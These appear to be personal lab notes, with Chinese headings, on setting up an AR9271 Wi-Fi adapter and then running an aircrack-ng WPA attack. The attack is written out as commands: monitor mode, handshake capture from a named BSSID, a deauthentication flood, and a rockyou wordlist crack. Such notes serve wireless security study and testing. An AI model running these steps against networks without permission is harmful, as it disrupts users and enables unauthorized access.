## 网卡
### chip
* AR9271
* RTL8812AU
### usb check flow
USB detect  
→ driver bind  
→ firmware upload  
→ device reboot  
→ wlan interface create  
```
#diver check
$lsusb
```
Bus 001 Device 022: ID 0cf3:9271 Qualcomm Atheros Communications AR9271 802.11n
```
#firemawe check
$ls -l /lib/firmware/ath9k_htc/
htc_9271.fw  
htc_9271-1.4.0.fw
$sudo modprobe -r ath9k_htc  
$sudo modprobe ath9k_htc
$dmesg | grep ath
```
[23314.110882] usb 1-2: ath9k_htc: Firmware ath9k_htc/htc_9271-1.4.0.fw requested  
[23314.393451] usb 1-2: ath9k_htc: Transferred FW: ath9k_htc/htc_9271-1.4.0.fw, size: 51008  
[23314.641801] ath9k_htc 1-2:1.0: ath9k_htc: HTC initialized with 33 credits  
[23314.905555] ath9k_htc 1-2:1.0: ath9k_htc: FW Version: 1.4  
[23314.905562] ath9k_htc 1-2:1.0: FW RMW support: On  
[23314.905565] ath: EEPROM regdomain: 0x65  
[23314.905567] ath: EEPROM indicates we should expect a direct regpair map  
[23314.905570] ath: Country alpha2 being used: 00  
[23314.905572] ath: Regpair used: 0x65  
[23314.910235] ath: EEPROM regdomain: 0x809c  
[23314.910239] ath: EEPROM indicates we should expect a country code  
[23314.910242] ath: doing EEPROM country->regdmn map search  
[23314.910245] ath: country maps to regdmn code: 0x52  
[23314.910247] ath: Country alpha2 being used: CN  
[23314.910250] ath: Regpair used: 0x52  
[23314.910252] ath: regdomain 0x809c dynamically updated by country element  
[23314.944736] ath9k_htc 1-2:1.0 wlxbc307dfc3994: renamed from wlan0  
## aircrack-ng
```
ip a
```
![](../assets/images/Pasted%20image%2020260527182628.png)
```
sudo airmon-ng check
sudo airmon-ng check kill
sudo airmon-ng start wlan0mon
ip a
```
![](../assets/images/Pasted%20image%2020260527182606.png)
```
sudo airodump-ng wlan0mon
```
![](../assets/images/Pasted%20image%2020260527182347.png)
```
sudo airodump-ng -c 5 --bssid F6:6D:2F:13:3B:D5 -w TPGuestcap wlan0mon
sudo aireplay-ng --deauth 8 -a F6:6D:2F:13:3B:D5 wlan0mon
```
![](../assets/images/Pasted%20image%2020260527182455.png)
```
aircrack-ng -a 2 -b F6:6D:2F:13:3B:D5 -w ../tools/rockyou.txt TPGuestcap-01.cap
```
![](../assets/images/Pasted%20image%2020260527182006.png)
## 恢复网络
```
sudo airmon stop wlan0mon
sudo systemctl start NetworkManager
```
